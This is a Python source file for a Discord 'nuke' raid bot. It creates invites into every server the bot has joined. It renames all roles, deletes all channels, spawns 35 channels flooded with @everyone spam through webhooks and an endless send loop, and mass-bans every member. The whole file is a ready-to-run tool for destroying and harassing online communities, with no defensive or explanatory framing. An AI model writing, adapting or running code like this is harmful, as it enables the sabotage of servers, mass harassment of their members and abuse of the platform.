import subprocess
import sys
import os

required_modules = ["discord", "requests", "asyncio"]

for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        print(f"Installing missing module: {module}...")
        subprocess.run([sys.executable, "-m", "pip", "install", module], check=True)

import discord
import requests
import asyncio
from discord import app_commands
from discord.ext import commands

def clear():
    if os.name == 'nt': 
        os.system('cls')
    else:  
        os.system('clear')

clear()

bot_token = input("Enter your bot token: ")
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands.")
    except Exception as e:
        print(f"Sync error: {e}")

@bot.tree.command(name="serverlist", description="List the servers the bot is in and its permissions.")
async def serverlist(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Server List",
        description="Here is a list of servers I am in along with my permissions:",
        color=discord.Color.from_rgb(255, 0, 0)
    )

    for guild in bot.guilds:
        permissions = guild.me.guild_permissions
        perms_list = [perm.replace("_", " ").title() for perm, value in permissions if value]
        perms_text = ", ".join(perms_list) if perms_list else "No Permissions"

        try:
            invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1, unique=True)
            invite_link = f"[Invite Link]({invite.url})"
        except:
            invite_link = "*No invite available*"

        embed.add_field(
            name=guild.name,
            value=f"**Permissions:** {perms_text}\n{invite_link}",
            inline=False
        )

    await interaction.response.send_message(embed=embed, ephemeral=True)

spam_message = ""
role_name = ""

@bot.tree.command(name="nukeserver", description="Deletes all channels, renames roles, and spams a message.")
@app_commands.describe(new_name="New server name", spam_message_input="Message to repeatedly send", channels_name="New channel name", new_role_name="New role name for all roles")
async def nukeserver(interaction: discord.Interaction, new_name: str, spam_message_input: str, channels_name: str, new_role_name: str):
    global spam_message, role_name
    spam_message = spam_message_input
    role_name = new_role_name
    await interaction.response.defer(ephemeral=True) 
    guild = interaction.guild
    user = interaction.user

    embed_server = discord.Embed(
        title="Raid Started",
        description=f"**Server:** {guild.name}\n**New Name:** `{new_name}`\n**Spam Message:** `{spam_message}`\n**New Role Name:** `{new_role_name}`",
        color=discord.Color.from_rgb(255, 0, 0)
    )
    await interaction.followup.send(embed=embed_server, ephemeral=True)

    embed_dm = discord.Embed(
        title="Raid Started",
        description=f"**Server:** `{guild.name}`\n**New Name:** `{new_name}`\n**Spam Message:** `{spam_message}`\n**New Role Name:** `{new_role_name}`",
        color=discord.Color.from_rgb(255, 0, 0)
    )
    try:
        await user.send(embed=embed_dm)
    except discord.Forbidden:
        print(f"[ERROR] Could not send DM to {user.name}.")

    failed_roles = []
    for role in guild.roles:
        try:
            await role.edit(name=new_role_name)
            await asyncio.sleep(0.5) 
        except discord.Forbidden:
            failed_roles.append(f"No permission to rename **{role.name}**.")
        except discord.HTTPException as e:
            failed_roles.append(f"Could not rename **{role.name}**: `{e}`")

    if failed_roles:
        embed_roles_error = discord.Embed(title="Role Rename Errors", description="\n".join(failed_roles), color=discord.Color.from_rgb(255, 0, 0))
        try:
            await user.send(embed=embed_roles_error)
        except discord.Forbidden:
            print(f"[ERROR] Could not send DM to {user.name}.")

    failed_channels = []
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.2) 
        except discord.HTTPException as e:
            if e.code == 50074:
                failed_channels.append(f"Cannot delete **{channel.name}** (Community channel).")
            else:
                failed_channels.append(f"Could not delete **{channel.name}**: `{e}`")
        except discord.Forbidden:
            failed_channels.append(f"No permission to delete **{channel.name}**.")

    if failed_channels:
        embed_error = discord.Embed(title="Deletion Errors", description="\n".join(failed_channels), color=discord.Color.from_rgb(255, 0, 0))
        try:
            await user.send(embed=embed_error)
        except discord.Forbidden:
            print(f"[ERROR] Could not send DM to {user.name}.")

    tasks = [guild.create_text_channel(channels_name) for _ in range(35)]
    new_channels = await asyncio.gather(*tasks)

    for channel in new_channels:
        num_webhooks = 5
        for _ in range(num_webhooks):
            webhook = await channel.create_webhook(name=f"GG{_}")
            for _ in range(2):
                await webhook.send(f"@everyone {spam_message}")
                await asyncio.sleep(0.2) 

@bot.event
async def on_guild_channel_create(channel):
    global spam_message
    while True:
        await channel.send(f"@everyone {spam_message}")
        await asyncio.sleep(0.2) 

@bot.tree.command(name="banall", description="Ban all members in the server.")
async def banall(interaction: discord.Interaction, message: str):
    try:
        guild = interaction.guild  
        skipped_members = []  
        banned_count = 0

        if not guild:
            return await interaction.user.send(embed=discord.Embed(
                title="Error", 
                description="Could not retrieve the server.", 
                color=discord.Color.from_rgb(255, 0, 0)
            ))

        if not interaction.user.guild_permissions.ban_members:
            return await interaction.user.send(embed=discord.Embed(
                title="Error", 
                description="You do not have permission to ban members.", 
                color=discord.Color.from_rgb(255, 0, 0)
            ))

        if not guild.me.guild_permissions.ban_members:
            return await interaction.user.send(embed=discord.Embed(
                title="Error", 
                description="I do not have permission to ban members.", 
                color=discord.Color.from_rgb(255, 0, 0)
            ))

        await interaction.response.send_message(embed=discord.Embed(
            title="Ban Process Started",
            description="Check your DM for info.",
            color=discord.Color.from_rgb(255, 0, 0)
        ), ephemeral=True)

        for member in guild.members:
            if member == interaction.user or member == bot.user:
                continue  

            try:
                embed_dm = discord.Embed(
                    title="Ban Notice",
                    description="You have been banned from the server.",
                    color=discord.Color.from_rgb(255, 0, 0)
                )
                await member.send(embed=embed_dm)
                await member.send(f"**Reason:** {message}")  
            except discord.HTTPException:
                pass  

            try:
                await member.ban(reason=message)
                banned_count += 1

                embed_ban_confirm = discord.Embed(
                    title="Ban Executed",
                    description=f"**User:** {member.name}#{member.discriminator}",
                    color=discord.Color.from_rgb(255, 0, 0)
                )
                await interaction.user.send(embed=embed_ban_confirm)

            except discord.Forbidden:
                skipped_members.append(f"Could not ban {member.name}")

        description = f"**Total Banned:** {banned_count}"
        if skipped_members:
            description += "\n\n**Skipped Members:**\n" + "\n".join(skipped_members)

        await interaction.user.send(embed=discord.Embed(
            title="Ban Process Completed",
            description=description,
            color=discord.Color.from_rgb(255, 0, 0)
        ))

    except discord.DiscordException as e:
        await interaction.user.send(embed=discord.Embed(
            title="Error",
            description="An error occurred while banning members.",
            color=discord.Color.from_rgb(255, 0, 0)
        ))
        await interaction.user.send(f"```{e}```")  


bot.run(bot_token)
